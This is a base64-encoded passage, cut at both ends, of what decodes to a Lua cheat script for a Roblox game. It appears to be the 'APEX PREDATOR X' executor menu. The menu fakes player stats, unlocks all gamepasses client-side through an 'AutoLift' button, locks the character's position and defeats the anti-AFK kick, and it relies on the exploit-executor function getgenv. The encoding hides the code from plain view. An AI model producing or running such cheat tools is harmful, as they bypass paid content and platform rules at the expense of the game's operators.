MgPSB7CiAgICBTdHJlbmd0aCA9IGZhbHNlLAogICAgRHVyYWJpbGl0eSA9IGZhbHNlLAogICAgUmViaXJ0aHMgPSBmYWxzZSwKICAgIEdlbXMgPSBmYWxzZSwKICAgIEtpbGxzID0gZmFsc2UsCiAgICBCcmF3bHMgPSBmYWxzZSwKICAgIEFnaWxpdHkgPSBmYWxzZSwKICAgIEdvb2RLYXJtYSA9IGZhbHNlLAogICAgRXZpbEthcm1hID0gZmFsc2UKfQoKLS0gRnVuY3Rpb24gdG8gZm9ybWF0IG51bWJlcnMgd2l0aCBhYmJyZXZpYXRpb25zCmxvY2FsIGZ1bmN0aW9uIGZvcm1hdE51bWJlcihudW0pCiAgICBpZiBub3QgbnVtIHRoZW4gcmV0dXJuICIwIiBlbmQKICAgIG51bSA9IHRvbnVtYmVyKG51bSkgb3IgMAogICAgCiAgICBsb2NhbCBmb3JtYXRzID0gewogICAgICAgIHsxZTE4LCAiUWkifSwgezFlMTUsICJRYSJ9LCB7MWUxMiwgIlQifSwgCiAgICAgICAgezFlOSwgIkIifSwgezFlNiwgIk0ifSwgezFlMywgIksifQogICAgfQogICAgCiAgICBmb3IgXywgZm9ybWF0IGluIGlwYWlycyhmb3JtYXRzKSBkbwogICAgICAgIGlmIG51bSA+PSBmb3JtYXRbMV0gdGhlbgogICAgICAgICAgICByZXR1cm4gc3RyaW5nLmZvcm1hdCgiJS4xZiVzIiwgbnVtIC8gZm9ybWF0WzFdLCBmb3JtYXRbMl0pCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiB0b3N0cmluZyhtYXRoLmZsb29yKG51bSkpCmVuZAoKLS0gRnVuY3Rpb24gdG8gcGFyc2UgaW5wdXQgd2l0aCBhYmJyZXZpYXRpb25zIChNYXg6IDEwMDAwUWEpCmxvY2FsIGZ1bmN0aW9uIHBhcnNlTnVtYmVyKGlucHV0KQogICAgaWYgbm90IGlucHV0IHRoZW4gcmV0dXJuIDAgZW5kCiAgICAKICAgIGlucHV0ID0gdG9zdHJpbmcoaW5wdXQpOnVwcGVyKCk6Z3N1YigiJXMrIiwgIiIpCiAgICAKICAgIGxvY2FsIG11bHRpcGxpZXJzID0gewogICAgICAgIFsiUUkiXSA9IDFlMTgsIFsiUUEiXSA9IDFlMTUsCiAgICAgICAgWyJUIl0gPSAxZTEyLCBbIlRSIl0gPSAxZTEyLAogICAgICAgIFsiQiJdID0gMWU5LCBbIkJOIl0gPSAxZTksCiAgICAgICAgWyJNIl0gPSAxZTYsIFsiTUwiXSA9IDFlNiwKICAgICAgICBbIksiXSA9IDFlMywgWyJLTiJdID0gMWUzCiAgICB9CiAgICAKICAgIC0tIENoZWNrIGlmIGl0J3MganVzdCBhIG51bWJlcgogICAgbG9jYWwgcGxhaW5OdW0gPSB0b251bWJlcihpbnB1dCkKICAgIGlmIHBsYWluTnVtIHRoZW4KICAgICAgICByZXR1cm4gbWF0aC5taW4ocGxhaW5OdW0sIDEwMDAwZTE1KSAtLSBDYXAgYXQgMTAwMDBRYQogICAgZW5kCiAgICAKICAgIC0tIENoZWNrIGZvciBhYmJyZXZpYXRpb24gZm9ybWF0IChlLmcuLCAiMS41SyIsICIxMDBNIiwgIjIuM0IiKQogICAgZm9yIGFiYnJldiwgbXVsdGlwbGllciBpbiBwYWlycyhtdWx0aXBsaWVycykgZG8KICAgICAgICBsb2NhbCBwYXR0ZXJuID0gIl4oWyVkJS5dKykiIC4uIGFiYnJldiAuLiAiJCIKICAgICAgICBsb2NhbCBtYXRjaCA9IGlucHV0Om1hdGNoKHBhdHRlcm4pCiAgICAgICAgaWYgbWF0Y2ggdGhlbgogICAgICAgICAgICBsb2NhbCBudW0gPSB0b251bWJlcihtYXRjaCkKICAgICAgICAgICAgaWYgbnVtIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBtYXRoLm1pbihudW0gKiBtdWx0aXBsaWVyLCAxMDAwMGUxNSkgLS0gQ2FwIGF0IDEwMDAwUWEKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgcmV0dXJuIDAKZW5kCgotLSBGdW5jdGlvbiB0byB1cGRhdGUgZGlzcGxheWVkIHN0YXRzIGluIHRoZSBnYW1lCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUdhbWVTdGF0cygpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIAogICAgLS0gVXBkYXRlIGxlYWRlcnN0YXRzCiAgICBsb2NhbCBsZWFkZXJzdGF0cyA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgibGVhZGVyc3RhdHMiKQogICAgaWYgbGVhZGVyc3RhdHMgdGhlbgogICAgICAgIC0tIFN0cmVuZ3RoCiAgICAgICAgbG9jYWwgc3RyZW5ndGggPSBsZWFkZXJzdGF0czpGaW5kRmlyc3RDaGlsZCgiU3RyZW5ndGgiKQogICAgICAgIGlmIHN0cmVuZ3RoIGFuZCB0b2dnbGVTdGF0ZXMuU3RyZW5ndGggdGhlbgogICAgICAgICAgICBzdHJlbmd0aC5WYWx1ZSA9IGZha2VTdGF0cy5TdHJlbmd0aAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIFJlYmlydGhzCiAgICAgICAgbG9jYWwgcmViaXJ0aHMgPSBsZWFkZXJzdGF0czpGaW5kRmlyc3RDaGlsZCgiUmViaXJ0aHMiKQogICAgICAgIGlmIHJlYmlydGhzIGFuZCB0b2dnbGVTdGF0ZXMuUmViaXJ0aHMgdGhlbgogICAgICAgICAgICByZWJpcnRocy5WYWx1ZSA9IGZha2VTdGF0cy5SZWJpcnRocwogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIEtpbGxzCiAgICAgICAgbG9jYWwga2lsbHMgPSBsZWFkZXJzdGF0czpGaW5kRmlyc3RDaGlsZCgiS2lsbHMiKQogICAgICAgIGlmIGtpbGxzIGFuZCB0b2dnbGVTdGF0ZXMuS2lsbHMgdGhlbgogICAgICAgICAgICBraWxscy5WYWx1ZSA9IGZha2VTdGF0cy5LaWxscwogICAgICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuS2lsbHMgdGhlbgogICAgICAgICAgICBraWxscyA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgICAgICBraWxscy5OYW1lID0gIktpbGxzIgogICAgICAgICAgICBraWxscy5WYWx1ZSA9IGZha2VTdGF0cy5LaWxscwogICAgICAgICAgICBraWxscy5QYXJlbnQgPSBsZWFkZXJzdGF0cwogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIEJyYXdscwogICAgICAgIGxvY2FsIGJyYXdscyA9IGxlYWRlcnN0YXRzOkZpbmRGaXJzdENoaWxkKCJCcmF3bHMiKQogICAgICAgIGlmIGJyYXdscyBhbmQgdG9nZ2xlU3RhdGVzLkJyYXdscyB0aGVuCiAgICAgICAgICAgIGJyYXdscy5WYWx1ZSA9IGZha2VTdGF0cy5CcmF3bHMKICAgICAgICBlbHNlaWYgdG9nZ2xlU3RhdGVzLkJyYXdscyB0aGVuCiAgICAgICAgICAgIGJyYXdscyA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgICAgICBicmF3bHMuTmFtZSA9ICJCcmF3bHMiCiAgICAgICAgICAgIGJyYXdscy5WYWx1ZSA9IGZha2VTdGF0cy5CcmF3bHMKICAgICAgICAgICAgYnJhd2xzLlBhcmVudCA9IGxlYWRlcnN0YXRzCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgLS0gVXBkYXRlIER1cmFiaWxpdHkKICAgIGxvY2FsIGR1cmFiaWxpdHkgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKQogICAgaWYgZHVyYWJpbGl0eSBhbmQgdG9nZ2xlU3RhdGVzLkR1cmFiaWxpdHkgdGhlbgogICAgICAgIGR1cmFiaWxpdHkuVmFsdWUgPSBmYWtlU3RhdHMuRHVyYWJpbGl0eQogICAgZW5kCiAgICAKICAgIC0tIFVwZGF0ZSBHZW1zICh1bmRlciBwbGF5ZXIpCiAgICBsb2NhbCBnZW1zID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJHZW1zIikKICAgIGlmIGdlbXMgYW5kIHRvZ2dsZVN0YXRlcy5HZW1zIHRoZW4KICAgICAgICBnZW1zLlZhbHVlID0gZmFrZVN0YXRzLkdlbXMKICAgIGVsc2VpZiB0b2dnbGVTdGF0ZXMuR2VtcyB0aGVuCiAgICAgICAgZ2VtcyA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgIGdlbXMuTmFtZSA9ICJHZW1zIgogICAgICAgIGdlbXMuVmFsdWUgPSBmYWtlU3RhdHMuR2VtcwogICAgICAgIGdlbXMuUGFyZW50ID0gcGxheWVyCiAgICBlbmQKICAgIAogICAgLS0gVXBkYXRlIEFnaWxpdHkKICAgIGxvY2FsIGFnaWxpdHkgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkFnaWxpdHkiKQogICAgaWYgYWdpbGl0eSBhbmQgdG9nZ2xlU3RhdGVzLkFnaWxpdHkgdGhlbgogICAgICAgIGFnaWxpdHkuVmFsdWUgPSBmYWtlU3RhdHMuQWdpbGl0eQogICAgZWxzZWlmIHRvZ2dsZVN0YXRlcy5BZ2lsaXR5IHRoZW4KICAgICAgICBhZ2lsaXR5ID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgYWdpbGl0eS5OYW1lID0gIkFnaWxpdHkiCiAgICAgICAgYWdpbGl0eS5WYWx1ZSA9IGZha2VTdGF0cy5BZ2lsaXR5CiAgICAgICAgYWdpbGl0eS5QYXJlbnQgPSBwbGF5ZXIKICAgIGVuZAogICAgCiAgICAtLSBVcGRhdGUgS2FybWEKICAgIGxvY2FsIGdvb2RLYXJtYSA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiZ29vZEthcm1hIikKICAgIGlmIGdvb2RLYXJtYSBhbmQgdG9nZ2xlU3RhdGVzLkdvb2RLYXJtYSB0aGVuCiAgICAgICAgZ29vZEthcm1hLlZhbHVlID0gZmFrZVN0YXRzLkdvb2RLYXJtYQogICAgZWxzZWlmIHRvZ2dsZVN0YXRlcy5Hb29kS2FybWEgdGhlbgogICAgICAgIGdvb2RLYXJtYSA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgIGdvb2RLYXJtYS5OYW1lID0gImdvb2RLYXJtYSIKICAgICAgICBnb29kS2FybWEuVmFsdWUgPSBmYWtlU3RhdHMuR29vZEthcm1hCiAgICAgICAgZ29vZEthcm1hLlBhcmVudCA9IHBsYXllcgogICAgZW5kCiAgICAKICAgIGxvY2FsIGV2aWxLYXJtYSA9IHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiZXZpbEthcm1hIikKICAgIGlmIGV2aWxLYXJtYSBhbmQgdG9nZ2xlU3RhdGVzLkV2aWxLYXJtYSB0aGVuCiAgICAgICAgZXZpbEthcm1hLlZhbHVlID0gZmFrZVN0YXRzLkV2aWxLYXJtYQogICAgZWxzZWlmIHRvZ2dsZVN0YXRlcy5FdmlsS2FybWEgdGhlbgogICAgICAgIGV2aWxLYXJtYSA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgIGV2aWxLYXJtYS5OYW1lID0gImV2aWxLYXJtYSIKICAgICAgICBldmlsS2FybWEuVmFsdWUgPSBmYWtlU3RhdHMuRXZpbEthcm1hCiAgICAgICAgZXZpbEthcm1hLlBhcmVudCA9IHBsYXllcgogICAgZW5kCmVuZAoKLS0gSW5zdHJ1Y3Rpb25zIFNlY3Rpb24KRmFrZVN0YXRzVGFiOlNlY3Rpb24oe1RpdGxlID0gIkluc3RydWN0aW9ucyJ9KQpGYWtlU3RhdHNUYWI6TGFiZWwoe1RpdGxlID0gIvCfk50gSG93IHRvIFVzZSIsIERlc2MgPSAiVG9nZ2xlIE9OIGZvciBlYWNoIHN0YXQgdG8gZW5hYmxlIGZha2Ugc3RhdCJ9KQpGYWtlU3RhdHNUYWI6TGFiZWwoe1RpdGxlID0gIvCfkqEgRm9ybWF0IiwgRGVzYyA9ICIxMDAwIG9yIDFLIG9yIDEuNU0gb3IgMi4zQiAoTWF4OiAxMDAwMFFhKSJ9KQoKLS0gSGVscGVyIGZ1bmN0aW9uIHRvIGNyZWF0ZSBzdGF0IGNvbnRyb2xzCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVN0YXRDb250cm9sKHN0YXROYW1lLCBkaXNwbGF5TmFtZSwgZGVzY3JpcHRpb24pCiAgICBGYWtlU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSBkaXNwbGF5TmFtZX0pCiAgICAKICAgIGxvY2FsIGlucHV0ID0gRmFrZVN0YXRzVGFiOlRleHRib3goewogICAgICAgIFRpdGxlID0gZGlzcGxheU5hbWUgLi4gIiBWYWx1ZSIsCiAgICAgICAgRGVzYyA9IGRlc2NyaXB0aW9uLAogICAgICAgIFBsYWNlaG9sZGVyID0gImUuZy4sIDEwMDAgb3IgMUsgb3IgMS41TSIsCiAgICAgICAgVmFsdWUgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHRleHQpCiAgICAgICAgICAgIGxvY2FsIHZhbHVlID0gcGFyc2VOdW1iZXIodGV4dCkKICAgICAgICAgICAgZmFrZVN0YXRzW3N0YXROYW1lXSA9IHZhbHVlCiAgICAgICAgICAgIGlmIHRvZ2dsZVN0YXRlc1tzdGF0TmFtZV0gdGhlbgogICAgICAgICAgICAgICAgdXBkYXRlR2FtZVN0YXRzKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBGYWtlU3RhdHNUYWI6VG9nZ2xlKHsKICAgICAgICBUaXRsZSA9IGRpc3BsYXlOYW1lIC4uICIgVG9nZ2xlIiwKICAgICAgICBEZXNjID0gIkVuYWJsZSBmYWtlICIgLi4gZGlzcGxheU5hbWU6bG93ZXIoKSwKICAgICAgICBWYWx1ZSA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgICAgIHRvZ2dsZVN0YXRlc1tzdGF0TmFtZV0gPSBzdGF0ZQogICAgICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgICAgICB1cGRhdGVHYW1lU3RhdHMoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCmVuZAoKLS0gQ3JlYXRlIGFsbCBzdGF0IGNvbnRyb2xzCmNyZWF0ZVN0YXRDb250cm9sKCJTdHJlbmd0aCIsICJTdHJlbmd0aCIsICJGYWtlIHN0cmVuZ3RoIHN0YXQiKQpjcmVhdGVTdGF0Q29udHJvbCgiRHVyYWJpbGl0eSIsICJEdXJhYmlsaXR5IiwgIkZha2UgZHVyYWJpbGl0eSBzdGF0IikgCmNyZWF0ZVN0YXRDb250cm9sKCJSZWJpcnRocyIsICJSZWJpcnRocyIsICJGYWtlIHJlYmlydGhzIGNvdW50IikKY3JlYXRlU3RhdENvbnRyb2woIkdlbXMiLCAiR2VtcyIsICJGYWtlIGdlbXMgYW1vdW50IikKY3JlYXRlU3RhdENvbnRyb2woIktpbGxzIiwgIktpbGxzIiwgIkZha2Uga2lsbHMgY291bnQiKQpjcmVhdGVTdGF0Q29udHJvbCgiQnJhd2xzIiwgIkJyYXdscyIsICJGYWtlIGJyYXdscyBjb3VudCIpCmNyZWF0ZVN0YXRDb250cm9sKCJBZ2lsaXR5IiwgIkFnaWxpdHkiLCAiRmFrZSBhZ2lsaXR5IHN0YXQiKQpjcmVhdGVTdGF0Q29udHJvbCgiR29vZEthcm1hIiwgIkdvb2QgS2FybWEiLCAiRmFrZSBnb29kIGthcm1hIikKY3JlYXRlU3RhdENvbnRyb2woIkV2aWxLYXJtYSIsICJFdmlsIEthcm1hIiwgIkZha2UgZXZpbCBrYXJtYSIpCgotLSBRdWljayBTZXQgU2VjdGlvbgpGYWtlU3RhdHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiUXVpY2sgU2V0In0pCgpGYWtlU3RhdHNUYWI6QnV0dG9uKHsKICAgIFRpdGxlID0gIlNldCBBbGwgdG8gMVFhIiwKICAgIERlc2MgPSAiUXVpY2tseSBzZXQgYWxsIHN0YXRzIHRvIDEgUXVhZHJpbGxpb24iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgZm9yIHN0YXROYW1lIGluIHBhaXJzKGZha2VTdGF0cykgZG8KICAgICAgICAgICAgZmFrZVN0YXRzW3N0YXROYW1lXSA9IDEwMDAwMDAwMDAwMDAwMDAKICAgICAgICAgICAgdG9nZ2xlU3RhdGVzW3N0YXROYW1lXSA9IHRydWUKICAgICAgICBlbmQKICAgICAgICB1cGRhdGVHYW1lU3RhdHMoKQogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJRdWljayBTZXQiLAogICAgICAgICAgICBEZXNjID0gIkFsbCBzdGF0cyBzZXQgdG8gMVFhIGFuZCBlbmFibGVkISIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKRmFrZVN0YXRzVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJEaXNhYmxlIEFsbCBTdGF0cyIsCiAgICBEZXNjID0gIlR1cm4gb2ZmIGFsbCBmYWtlIHN0YXRzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGZvciBzdGF0TmFtZSBpbiBwYWlycyh0b2dnbGVTdGF0ZXMpIGRvCiAgICAgICAgICAgIHRvZ2dsZVN0YXRlc1tzdGF0TmFtZV0gPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICJGYWtlIFN0YXRzIiwKICAgICAgICAgICAgRGVzYyA9ICJBbGwgZmFrZSBzdGF0cyBkaXNhYmxlZCEiLAogICAgICAgICAgICBUaW1lID0gMwogICAgICAgIH0pCiAgICBlbmQKfSkKCi0tIE1pc2MgVGFiCmxvY2FsIE1pc2NUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJNaXNjIiwgSWNvbiA9ICJzZXR0aW5ncyJ9KQoKLS0gVXRpbGl0eSBTZWN0aW9uCk1pc2NUYWI6U2VjdGlvbih7VGl0bGUgPSAiVXRpbGl0eSJ9KQoKTWlzY1RhYjpCdXR0b24oewogICAgVGl0bGUgPSAiR2FtZXBhc3MgQXV0b0xpZnQiLAogICAgRGVzYyA9ICJVbmxvY2sgYWxsIGdhbWVwYXNzZXMiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgZ2FtZXBhc3NGb2xkZXIgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuZ2FtZXBhc3NJZHMKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgICAgIGZvciBfLCBnYW1lcGFzcyBpbiBwYWlycyhnYW1lcGFzc0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBsb2NhbCB2YWx1ZSA9IEluc3RhbmNlLm5ldygiSW50VmFsdWUiKQogICAgICAgICAgICB2YWx1ZS5OYW1lID0gZ2FtZXBhc3MuTmFtZQogICAgICAgICAgICB2YWx1ZS5WYWx1ZSA9IGdhbWVwYXNzLlZhbHVlCiAgICAgICAgICAgIHZhbHVlLlBhcmVudCA9IHBsYXllci5vd25lZEdhbWVwYXNzZXMKICAgICAgICBlbmQKICAgICAgICBXaW5kb3c6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiR2FtZXBhc3MgQXV0b0xpZnQiLAogICAgICAgICAgICBEZXNjID0gIkFsbCBnYW1lcGFzc2VzIHVubG9ja2VkISIsCiAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgfSkKICAgIGVuZAp9KQoKLS0gUGVyZm9ybWFuY2UgU2VjdGlvbgpNaXNjVGFiOlNlY3Rpb24oe1RpdGxlID0gIlBlcmZvcm1hbmNlIn0pCgpNaXNjVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJIaWRlIEZyYW1lcyIsCiAgICBEZXNjID0gIlZlcnkgT3AiLAogICAgVmFsdWUgPSBmYWxzZSwgLS0gRGVmYXVsdCBPRkYKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgb2JqLk5hbWU6bWF0Y2goIkZyYW1lJCIpIHRoZW4KICAgICAgICAgICAgICAgIG9iai5WaXNpYmxlID0gbm90IHN0YXRlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBDaGFyYWN0ZXIgU2VjdGlvbgpNaXNjVGFiOlNlY3Rpb24oe1RpdGxlID0gIkNoYXJhY3RlciJ9KQoKTWlzY1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiUG9zaXRpb24gTG9jayIsCiAgICBEZXNjID0gIkxvY2sgeW91ciBjaGFyYWN0ZXIgaW4gcGxhY2UiLAogICAgVmFsdWUgPSBmYWxzZSwgLS0gRGVmYXVsdCBPRkYKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBsb2NhbCBjdXJyZW50UG9zID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICBnZXRnZW52KCkucG9zTG9jayA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IGN1cnJlbnRQb3MKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiUG9zaXRpb24gTG9jayIsCiAgICAgICAgICAgICAgICBEZXNjID0gIlBvc2l0aW9uIGxvY2tlZCBpbiBwbGFjZSEiLAogICAgICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICAgICAgfSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIGdldGdlbnYoKS5wb3NMb2NrIHRoZW4KICAgICAgICAgICAgICAgIGdldGdlbnYoKS5wb3NMb2NrOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgZ2V0Z2VudigpLnBvc0xvY2sgPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiUG9zaXRpb24gTG9jayIsCiAgICAgICAgICAgICAgICBEZXNjID0gIlBvc2l0aW9uIGxvY2sgZGlzYWJsZWQhIiwKICAgICAgICAgICAgICAgIFRpbWUgPSAzCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEFudGkgQUZLIFNlY3Rpb24KTWlzY1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJBbnRpIEFGSyJ9KQoKCk1pc2NUYWI6VG9nZ2xlKHsKICAgIFRpdGxlID0gIkFudGkgQUZLIiwKICAgIERlc2MgPSAiUHJldmVudCBiZWluZyBraWNrZWQgZm9yIGluYWN0aXZpdHkiLAogICAgVmFsdWUgPSB0cnVlLCAtLSBEZWZhdWx0IE9GRgogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgICAgIC0tIENyZWF0ZSBGYWRpbmcgRGlzcGxheQogICAgICAgICAgICBsb2NhbCBEaXNwbGF5R3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgICAgICAgICBsb2NhbCBEaXNwbGF5TGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgIGxvY2FsIFRpbWVyTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICAgICAgICAgIAogICAgICAgICAgICBEaXNwbGF5R3VpLk5hbWUgPSAiQW50aUFGS0Rpc3BsYXkiCiAgICAgICAgICAgIERpc3BsYXlHdWkuUGFyZW50ID0gZ2FtZS5Db3JlR3VpCiAgICAgICAgICAgIERpc3BsYXlHdWkuWkluZGV4QmVoYXZpb3IgPSBFbnVtLlpJbmRleEJlaGF2aW9yLlNpYmxpbmcKICAgICAgICAgICAgCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5OYW1lID0gIkRpc3BsYXlMYWJlbCIKICAgICAgICAgICAgRGlzcGxheUxhYmVsLlBhcmVudCA9IERpc3BsYXlHdWkKICAgICAgICAgICAgRGlzcGxheUxhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQsIDAsIDAuMDEsIDApCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5TaXplID0gVURpbTIubmV3KDAuMiwgMCwgMCwgMzApCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJsYWNrCiAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0ID0gIkFQRVggUFJFREFUT1IgWCAtIEFOVEkgQUZLIgogICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dFNpemUgPSAxOAogICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgRGlzcGxheUxhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5DZW50ZXIKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEdyYWRpZW50IGZvciBEaXNwbGF5TGFiZWwKICAgICAgICAgICAgbG9jYWwgZGlzcGxheUdyYWRpZW50ID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IikKICAgICAgICAgICAgZGlzcGxheUdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoewogICAgICAgICAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQigyOCwgMjE2LCAyMTApKSwgICAtLSAjMUNEOEQyCiAgICAgICAgICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDE0NywgMjM3LCAxOTkpKSAgIC0tICM5M0VEQzcKICAgICAgICAgICAgfSkKICAgICAgICAgICAgZGlzcGxheUdyYWRpZW50LlJvdGF0aW9uID0gMAogICAgICAgICAgICBkaXNwbGF5R3JhZGllbnQuUGFyZW50ID0gRGlzcGxheUxhYmVsCiAgICAgICAgICAgIAogICAgICAgICAgICBUaW1lckxhYmVsLk5hbWUgPSAiVGltZXJMYWJlbCIKICAgICAgICAgICAgVGltZXJMYWJlbC5QYXJlbnQgPSBEaXNwbGF5R3VpCiAgICAgICAgICAgIFRpbWVyTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgVGltZXJMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQsIDAsIDAuMDQ1LCAwKQogICAgICAgICAgICBUaW1lckxhYmVsLlNpemUgPSBVRGltMi5uZXcoMC4yLCAwLCAwLCAzMCkKICAgICAgICAgICAgVGltZXJMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0ID0gIjAwOjAwOjAwIgogICAgICAgICAgICBUaW1lckxhYmVsLlRleHRTaXplID0gMTIKICAgICAgICAgICAgVGltZXJMYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICBUaW1lckxhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5DZW50ZXIKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEdyYWRpZW50IGZvciBUaW1lckxhYmVsCiAgICAgICAgICAgIGxvY2FsIHRpbWVyR3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQogICAgICAgICAgICB0aW1lckdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoewogICAgICAgICAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQigyOCwgMjE2LCAyMTApKSwgICAtLSAjMUN